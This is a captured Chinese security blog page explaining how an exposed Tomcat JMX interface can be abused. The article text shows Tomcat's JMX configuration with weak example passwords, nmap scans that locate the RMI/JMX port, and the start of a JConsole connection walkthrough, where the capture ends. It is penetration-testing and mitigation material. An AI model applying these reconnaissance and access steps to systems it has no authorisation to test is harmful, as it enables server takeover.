<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />	
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
<title>通过JMX访问破坏Apache Tomcat - SecPulse.COM | 安全脉搏</title>
<meta name="description" content="0x00 前言" />
<meta name="keywords" content="JConsole,JMX接口,Nmap,Tomcat服务器,未经授权,本地监视,目录遍历,管理远程Tomcat" />

<link rel='stylesheet' id='style-css'  href='https://www.secpulse.com/wp-content/themes/sec/style.css?ver=2014.9.21' type='text/css' media='all' />
<link rel='stylesheet' id='jquery.fancybox-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/jquery.fancybox.css?ver=1.0' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='https://www.secpulse.com/wp-content/themes/sec/css/font-awesome.min.css?ver=1.0' type='text/css' media='all' />
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.min.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.fancybox.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/helpers/jquery.fancybox-buttons.js?ver=2.15'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/jquery.mousewheel-3.0.6.pack.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/owl.carousel.min.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/custom.js?ver=1.0'></script>
<script type='text/javascript' src='https://www.secpulse.com/wp-content/themes/sec/js/comments-ajax.js?ver=1.3'></script>
<link rel='canonical' href='https://www.secpulse.com/archives/55367.html' />
<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
<script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?7f4cc5524dcb1aec487b4266c18bae48";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>


</head>
<body class="single single-post postid-55367 single-format-standard">
	<header id="header" class="header clr">
		<div class="header-top inner clr">
	<hgroup class="logo-main"><h1 class="logo"><a href="https://www.secpulse.com/" rel="home" title="安全脉搏">安全脉搏</a></h1><h4 class="xs-hidden">分享技术，悦享品质 
	</h4>
	</hgroup>

<div class="login xs-hidden">
				<div class="logindiv">
					<div class="img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/05/rabbit.jpeg" width="36" height="36" alt="" class="avatar avatar-36 wp-user-avatar wp-user-avatar-36 photo avatar-default" /></div><span href="javascript:void(0);" title="用户" class="yh">用户</span><i
						class="fa fa-caret-down fa-2"></i>
					<ul class="login-links">
						<li class="log"><a
							href="https://www.secpulse.com/wp-login.php"
							target="_blank"><i class="fa fa-arrow-right"></i><span>登陆</span></a></li>
						<li class="exit"><a
							href="https://www.secpulse.com/wp-login.php?action=register"><i
								class="fa fa-user-times"></i><span>注册</span></a></li>
					</ul>
	
  </div>
			</div>
			<div class="top-search xs-hidden">
  <form id="search" method="get" action="https://www.secpulse.com" >
	<input type="text" name="s" id="s" autocomplete="off"  placeholder="输入搜索内容">
	<button class="btn-search"> <i class="fa fa-search"></i></button>
</form></div>
			<div class="menu-button">
				<i class="fa fa-bars fa-3x"></i>
			</div>
		</div>


		<div class="main-nav  xs-hidden">
			<div class="inner clr"><nav class="left-nav clr"><ul id="menu-%e5%af%bc%e8%88%aa" class="header-menu-nav"><li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li id="menu-item-17" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li id="menu-item-34048" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li id="menu-item-34047" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li id="menu-item-34046" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li id="menu-item-34565" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li id="menu-item-34568" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li id="menu-item-35948" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li id="menu-item-35949" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li id="menu-item-35950" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li id="menu-item-35951" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li id="menu-item-35952" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li id="menu-item-35953" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li id="menu-item-18" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li id="menu-item-35956" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li id="menu-item-35957" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li id="menu-item-379" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li id="menu-item-51480" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li id="menu-item-54332" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li id="menu-item-35955" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li id="menu-item-54333" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li id="menu-item-368" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li id="menu-item-35947" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li id="menu-item-35954" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li id="menu-item-50217" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li id="menu-item-51479" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li id="menu-item-16" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li id="menu-item-52" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li id="menu-item-6645" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>  <nav class="right-nav clr "><ul id="menu-%e5%af%bc%e8%88%aa%e4%ba%8c" class="header-menu-nav"><li id="menu-item-33967" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33967"><a title="付费渗透测试" href="http://service.secpulse.com">安全服务</a></li>
<li id="menu-item-52043" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-52043"><a title="安全从业者最实用的安全导航" href="http://nav.secpulse.com">安全导航</a></li>
<li id="menu-item-33966" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33966"><a title="安识科技" href="https://www.duoyinsu.com">多因素</a></li>
</ul></nav></div>
		</div>
		<div class="nav-bg"></div>
   <nav class="mini-nav visible-xs"><ul id="menu-%e5%af%bc%e8%88%aa-1" class="menu-mini-nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15"><a href="https://www.secpulse.com/">首页</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-17"><a href="https://www.secpulse.com/archives/category/articles">文章</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34048"><a href="https://www.secpulse.com/archives/category/articles/intranet-penetration">内网渗透</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34047"><a href="https://www.secpulse.com/archives/category/articles/code-audit">代码审计</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-34046"><a href="https://www.secpulse.com/archives/category/articles/web">Web安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34565"><a href="https://www.secpulse.com/archives/category/articles/sec-doc">安全文献</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-34568"><a href="https://www.secpulse.com/archives/category/articles/social-engineering">社会工程</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35948"><a href="https://www.secpulse.com/archives/category/articles/wireless">无线安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35949"><a href="https://www.secpulse.com/archives/category/articles/mobile-security">移动安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-35950"><a href="https://www.secpulse.com/archives/category/articles/system">系统安全</a>
	<ul class="sub-menu">
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35951"><a href="https://www.secpulse.com/archives/category/articles/system/linux">Linux</a></li>
		<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35952"><a href="https://www.secpulse.com/archives/category/articles/system/windows">Windows</a></li>
	</ul>
</li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35953"><a href="https://www.secpulse.com/archives/category/articles/reverse-break">逆向破解</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-has-children menu-item-18"><a href="https://www.secpulse.com/archives/category/news">资讯</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35956"><a href="https://www.secpulse.com/archives/category/news/china-news">国内资讯</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-35957"><a href="https://www.secpulse.com/archives/category/news/world-news">国外资讯</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-379"><a href="https://www.secpulse.com/archives/category/construction">安全建设</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51480"><a href="https://www.secpulse.com/archives/category/construction/securityissue">安全管理</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54332"><a href="https://www.secpulse.com/archives/category/construction/%e4%b8%9a%e5%8a%a1%e5%ae%89%e5%85%a8">业务安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35955"><a href="https://www.secpulse.com/archives/category/construction/bigdata">数据分析</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-54333"><a href="https://www.secpulse.com/archives/category/construction/security-reports">安全报告</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-368"><a href="https://www.secpulse.com/archives/category/exclusive">独家</a>
<ul class="sub-menu">
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35947"><a href="https://www.secpulse.com/archives/category/articles/industrial-safety">工控安全</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-35954"><a href="https://www.secpulse.com/archives/category/exclusive/ctf-writeup">CTF</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-50217"><a href="https://www.secpulse.com/archives/category/exclusive/duoyinsu">多因素令牌</a></li>
	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-51479"><a href="https://www.secpulse.com/archives/category/exclusive/dataleakage">数据泄露</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16"><a href="https://www.secpulse.com/archives/category/tools">工具</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-52"><a href="https://www.secpulse.com/archives/category/hiring">招聘</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.secpulse.com/newsend">投稿</a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6645"><a href="https://www.secpulse.com/archives/category/vul">漏洞</a></li>
</ul></nav>     </header><section class="xs-main index-main clr">
<div class="inner">
<div class="xs-left">
<nav class="crumbs">现在位置： <a title="返回首页" href="https://www.secpulse.com">首页</a> &gt; <a href="https://www.secpulse.com/archives/category/articles">文章</a> &gt; <a href="https://www.secpulse.com/archives/category/articles/web" rel="category tag">Web安全</a> &gt; <a href="https://www.secpulse.com/archives/category/news">资讯</a> &gt; <a href="https://www.secpulse.com/archives/category/news/world-news" rel="category tag">国外资讯</a> &gt;  正文 </nav><article id="post-55367" class="post-55367 post type-post status-publish format-standard has-post-thumbnail hentry category-web category-world-news tag-jconsole tag-jmx tag-nmap tag-tomcat tag-63333 tag-63334 tag-3627">
	<header class="single-header">
		<h1>通过JMX访问破坏Apache Tomcat</h1>
			<div class="single-meta">
				
		    <div class="time"><i></i> <a href="javascript:void(0);">2017 /2/9 13:37</a></div>
			<div class="eye xs-hidden"><i class="fa fa-eye fa-1"></i><a href="javascript:void(0);">3,334</a> </div>			<div class="comments xs-hidden"><i class="fa fa-comments fa-1"></i><a href="https://www.secpulse.com/archives/55367.html#respond">沙发</a></div>
			
			
		</div>
		<!-- .entry-meta -->
	</header>
	<!-- .single-header -->

	<div class="single-main">
		<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/1111111111111.jpg"><img class=" size-full wp-image-55391 aligncenter" src="http://www.secpulse.com/wp-content/uploads/2017/02/1111111111111.jpg" alt="1111111111111" width="600" height="352" /></a></p>
<h2><strong>0x00 前言</strong></h2>
<hr />
<p>本文主要关注<a href="https://www.secpulse.com/archives/tag/Tomcat服务器" target="_blank">Tomcat服务器</a>的一些配置问题，可以将Java管理扩展（JMX）服务暴露到外部网络中，来用于远程监视和管理的目的。</p>
<p>通过使用Java开发工具包（JDK）中的JConsole工具，这些功能可能被攻击者滥用来获得系统的控制权限。</p>
<p>本文的编写是为了来强调这种之前不为作者所知的新的攻击方式，它与Tomcat服务器暴露的<a href="https://www.secpulse.com/archives/tag/JMX接口" target="_blank">JMX接口</a>有关。</p>
<p>希望在这里提供了足够的信息，以利于提出阻止这种利用的有效的缓解措施并且帮助渗透测试团队评估使用这种配置的Tomcat服务器的状态。</p>
<p>本文讨论的这个问题已经提交给Tomcat团队，被分类为程序的已知功能，并且目前没有任何补丁提供。</p>
<p>总而言之，Tomcat指出：</p>
<p>Java JMX访问相当于admin/root访问，其处理方式与对具有admin / root权限的机器的物理访问相同。</p>
<p>其他敏感的信息，比如session IDs，可通过JMX访问，并且隐藏这些信息将严重降低JMX接口的实用性。</p>
<p>Tomcat文档通常不涵盖JMX的主题，但是在其他地方会涵盖它。</p>
<p>任何读者在阅读本文后都应该遵循第九节中的建议。</p>
<p><strong>0x01 Tomcat的JMX服务</strong></p>
<hr />
<p>Apache Tomcat的JMX服务通常被用来通过网络监控和<a href="https://www.secpulse.com/archives/tag/管理远程Tomcat" target="_blank">管理远程Tomcat</a></p>
<p>实例，通过Java远程方法调用（RMI）来与服务器交互。</p>
<p>这个服务默认不开启，与之相反的是其他常见的Java企业版的服务器（比如JBoss）是默认配置开启的。</p>
<p>为了开启Tomcat的JMX服务，需要在setenv.sh/setenv.bat做一些简单的修改，这个脚本是用来设置环境变量和Catalina进程启动时的一些属性。</p>
<p>JMX服务可以配置为支持认证，但是它默认不开启。当认证被开启（总是被推荐），它的授权模型允许访问属于只读或读写角色的两个不同的用户。</p>
<p>网络上关于JMX接口的配置信息很少且过时了。</p>
<p>例如，在下面的URL对应的网页的标题为“监视和管理Tomcat”，但是它的配置指导是基于java 6版本的：</p>
<p><a href="http://tomcat.apache.org/tomcat-8.0-doc/monitoring.html#Enabling_JMX_Remote">http://tomcat.apache.org/tomcat-8.0-doc/monitoring.html#Enabling_JMX_Remote</a></p>
<p>这个指南的第一段开始有一段注释：</p>
<p>“注释：这个配置只在你需要远程监控Tomcat时才开启，如果只是<a href="https://www.secpulse.com/archives/tag/本地监视" target="_blank">本地监视</a>则不需要开启，且需要使用启动Tomcat相同的用户。”</p>
<p>这个快速指南包括认证未开启的简单配置。然后它建议需要认证时，修改配置来启用上述的两个角色且分配密码。</p>
<p>指南中有意思的一个片段如下：</p>
<p>如果你需要认证，添加并修改这个：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">-Dcom.sun.management.jmxremote.authenticate=true</code></div>
<div class="line number2 index1 alt1"><code class="plain plain">-Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password</code></div>
<div class="line number3 index2 alt2"><code class="plain plain">-Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>编辑$CATALINA_BASE/conf/jmxremote.access文件：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">monitorRole readonly</code></div>
<div class="line number2 index1 alt1"><code class="plain plain">controlRole readwrite</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>编辑$CATALINA_BASE/conf/jmxremote.password文件：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">monitorRole tomcat</code></div>
<div class="line number2 index1 alt1"><code class="plain plain">controlRole tomcat</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>提示：密码文件应该是只读的，只能用和运行Tomcat相同的操作系统用户来访问。</p>
<p>如上所见，jmxremote.access文件包含两个用户名（monitorRole和controlRole）和他们相关的角色。在jmxremote.password文件中设置这些用户的密码。</p>
<p>对此服务始终建议启用认证，但快速指南不强调此功能。</p>
<p>这个指南不强调为只读和读写用户设置强密码的重要性。这就是为什么在现场渗透测试期间，这个接口经常被发现没有配置认证或者使用了与指南建议类似的弱密码。</p>
<h2><strong>0x02 决定是否启用Tomcat的JMX接口</strong></h2>
<hr />
<p>通常需要使用<a href="https://www.secpulse.com/archives/tag/nmap" target="_blank">nmap</a>进行扫描，来确认与Tomcat关联的JMX接口是否已启动并在远程服务器上运行。</p>
<p>在这种情况下强烈建议使用--version-all和-A标志，因为它会告诉nmap触发附加探测器来检测非标准端口上JMX接口的存在。</p>
<p>例如，假设使用以下命令行扫描Tomcat服务器：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
<div class="line number6 index5 alt1">6</div>
<div class="line number7 index6 alt2">7</div>
<div class="line number8 index7 alt1">8</div>
<div class="line number9 index8 alt2">9</div>
<div class="line number10 index9 alt1">10</div>
<div class="line number11 index10 alt2">11</div>
<div class="line number12 index11 alt1">12</div>
<div class="line number13 index12 alt2">13</div>
<div class="line number14 index13 alt1">14</div>
<div class="line number15 index14 alt2">15</div>
<div class="line number16 index15 alt1">16</div>
<div class="line number17 index16 alt2">17</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">&gt;nmap -p- -sV -A 192.168.11.128 -n</code></div>
<div class="line number2 index1 alt1"><code class="plain plain">Nmap scan report for 192.168.11.128</code></div>
<div class="line number3 index2 alt2"><code class="plain plain">Host is up (0.00028s latency).</code></div>
<div class="line number4 index3 alt1"><code class="plain plain">Not shown: 65521 closed ports</code></div>
<div class="line number5 index4 alt2"><code class="plain plain">PORT STATE SERVICE VERSION</code></div>
<div class="line number6 index5 alt1"><code class="plain plain">...</code></div>
<div class="line number7 index6 alt2"><code class="plain plain">2001/tcp open dc?</code></div>
<div class="line number8 index7 alt1"><code class="plain plain">...</code></div>
<div class="line number9 index8 alt2"><code class="plain plain">8009/tcp open ajp13 Apache Jserv (Protocol v1.3)</code></div>
<div class="line number10 index9 alt1"><code class="plain plain">|_ajp-methods: Failed to get a valid response for the OPTION request</code></div>
<div class="line number11 index10 alt2"><code class="plain plain">8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1</code></div>
<div class="line number12 index11 alt1"><code class="plain plain">|_http-favicon: Apache Tomcat</code></div>
<div class="line number13 index12 alt2"><code class="plain plain">|_http-open-proxy: Proxy might be redirecting requests</code></div>
<div class="line number14 index13 alt1"><code class="plain plain">|_http-server-header: Apache-Coyote/1.1</code></div>
<div class="line number15 index14 alt2"><code class="plain plain">|_http-title: Apache Tomcat/8.0.39</code></div>
<div class="line number16 index15 alt1"><code class="plain plain">...</code></div>
<div class="line number17 index16 alt2"><code class="plain plain">49222/tcp open unknown</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>为了简单起见，上面的扫描结果仅包括与Tomcat相关的端口。可以看到，端口2001/tcp和端口49222/tcp未明确标识。</p>
<p>然而，添加--version-all标志将显示更多有趣的信息：</p>
<table class="syntaxhighlighter  plain" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td class="gutter">
<div class="line number1 index0 alt2">1</div>
<div class="line number2 index1 alt1">2</div>
<div class="line number3 index2 alt2">3</div>
<div class="line number4 index3 alt1">4</div>
<div class="line number5 index4 alt2">5</div>
<div class="line number6 index5 alt1">6</div>
<div class="line number7 index6 alt2">7</div>
<div class="line number8 index7 alt1">8</div>
<div class="line number9 index8 alt2">9</div>
<div class="line number10 index9 alt1">10</div>
<div class="line number11 index10 alt2">11</div>
<div class="line number12 index11 alt1">12</div>
<div class="line number13 index12 alt2">13</div>
<div class="line number14 index13 alt1">14</div>
<div class="line number15 index14 alt2">15</div>
<div class="line number16 index15 alt1">16</div>
<div class="line number17 index16 alt2">17</div>
<div class="line number18 index17 alt1">18</div>
<div class="line number19 index18 alt2">19</div>
<div class="line number20 index19 alt1">20</div>
<div class="line number21 index20 alt2">21</div>
<div class="line number22 index21 alt1">22</div>
<div class="line number23 index22 alt2">23</div>
<div class="line number24 index23 alt1">24</div>
<div class="line number25 index24 alt2">25</div>
<div class="line number26 index25 alt1">26</div>
<div class="line number27 index26 alt2">27</div>
<div class="line number28 index27 alt1">28</div>
</td>
<td class="code">
<div class="container">
<div class="line number1 index0 alt2"><code class="plain plain">&gt;nmap -p- -A -sV --version-all 192.168.11.128</code></div>
<div class="line number2 index1 alt1"><code class="plain plain">Nmap scan report for 192.168.11.128</code></div>
<div class="line number3 index2 alt2"><code class="plain plain">Host is up (0.00032s latency).</code></div>
<div class="line number4 index3 alt1"><code class="plain plain">Not shown: 65521 closed ports</code></div>
<div class="line number5 index4 alt2"><code class="plain plain">PORT STATE SERVICE VERSION</code></div>
<div class="line number6 index5 alt1"><code class="plain plain">...</code></div>
<div class="line number7 index6 alt2"><code class="plain plain">2001/tcp open java-rmi Java RMI Registry</code></div>
<div class="line number8 index7 alt1"><code class="plain plain">| rmi-dumpregistry:</code></div>
<div class="line number9 index8 alt2"><code class="plain plain">| jmxrmi</code></div>
<div class="line number10 index9 alt1"><code class="plain plain">| implements javax.management.remote.rmi.RMIServer,</code></div>
<div class="line number11 index10 alt2"><code class="plain plain">| extends</code></div>
<div class="line number12 index11 alt1"><code class="plain plain">| java.lang.reflect.Proxy</code></div>
<div class="line number13 index12 alt2"><code class="plain plain">| fields</code></div>
<div class="line number14 index13 alt1"><code class="plain plain">| Ljava/lang/reflect/InvocationHandler; h</code></div>
<div class="line number15 index14 alt2"><code class="plain plain">| java.rmi.server.RemoteObjectInvocationHandler</code></div>
<div class="line number16 index15 alt1"><code class="plain plain">| @192.168.11.128:2001</code></div>
<div class="line number17 index16 alt2"><code class="plain plain">| extends</code></div>
<div class="line number18 index17 alt1"><code class="plain plain">|_ java.rmi.server.RemoteObject</code></div>
<div class="line number19 index18 alt2"><code class="plain plain">...</code></div>
<div class="line number20 index19 alt1"><code class="plain plain">8009/tcp open ajp13 Apache Jserv (Protocol v1.3)</code></div>
<div class="line number21 index20 alt2"><code class="plain plain">|_ajp-methods: Failed to get a valid response for the OPTION request</code></div>
<div class="line number22 index21 alt1"><code class="plain plain">8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1</code></div>
<div class="line number23 index22 alt2"><code class="plain plain">|_http-favicon: Apache Tomcat</code></div>
<div class="line number24 index23 alt1"><code class="plain plain">|_http-open-proxy: Proxy might be redirecting requests</code></div>
<div class="line number25 index24 alt2"><code class="plain plain">|_http-server-header: Apache-Coyote/1.1</code></div>
<div class="line number26 index25 alt1"><code class="plain plain">|_http-title: Apache Tomcat/8.0.39</code></div>
<div class="line number27 index26 alt2"><code class="plain plain">...</code></div>
<div class="line number28 index27 alt1"><code class="plain plain">49222/tcp open rmiregistry Java RMI</code></div>
</div>
</td>
</tr>
</tbody>
</table>
<p>在这种情况下，JMX服务被配置为在非标准端口2001/tcp而不是端口1099/tcp上运行，1099/tcp通常被这种服务的优先选择。</p>
<p>此外，应当注意的是当JMX接口运行时，运行Java RMI的随机端口也可用于Tomcat。从客户端/攻击者角度来看，能够连接此端口也很重要。</p>
<p>也就是说，单独使用nmap无法确定Tomcat JMX接口是否启用认证。</p>
<h2><strong>0x03 使用<a href="https://www.secpulse.com/archives/tag/JConsole" target="_blank">JConsole</a>连接JMX服务</strong></h2>
<hr />
<p>如果你使用Windows，JConsole是JDK中的一个小的可执行文件，存储在bin文件夹中。启动后主界面如下图：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/1.jpg"><img class="alignnone size-full wp-image-55371" src="http://www.secpulse.com/wp-content/uploads/2017/02/1.jpg" alt="1" width="464" height="400" /></a></p>
<p>图1 – Jconsole主界面</p>
<p>JConsole也在Linux版的JDK中提供，且在Kali中找到如下图：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/2.jpg"><img class="alignnone size-full wp-image-55372" src="http://www.secpulse.com/wp-content/uploads/2017/02/2.jpg" alt="2" width="399" height="400" /></a></p>
<p>图2 – Kali中的JConsole</p>
<p>如果逆向远程连接到Tomcat JMX接口，选择Remote Process选项且输入目标的IP地址加端口号。点击Connect按钮：</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/3.jpg"><img class="alignnone size-full wp-image-55373" src="http://www.secpulse.com/wp-content/uploads/2017/02/3.jpg" alt="3" width="627" height="241" /></a></p>
<p>图3 – 设置目标</p>
<p>JConsole能够检测到SSL是否开启，并且显示如下提示：</p>
